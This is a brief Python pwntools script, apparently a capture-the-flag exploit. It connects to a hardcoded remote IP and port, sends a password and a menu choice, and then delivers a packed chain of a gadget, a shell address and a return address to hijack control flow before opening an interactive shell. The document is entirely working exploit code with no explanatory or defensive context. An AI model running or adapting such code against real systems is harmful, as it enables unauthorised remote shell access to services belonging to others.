from pwn import *

r = remote('110.10.212.139', 50410)

print r.recv()

r.send('$W337k!++y\n')

print r.recv()
print r.recv()

r.send('3\n')

print r.recv()

import struct

ra = struct.pack('<Q', 0x14000)
gadget = struct.pack('<Q', 0x014036)
shell = struct.pack('<Q', 0x14029)

cat = gadget + shell + ra

print cat.encode('hex')

r.send(cat)

r.interactive()



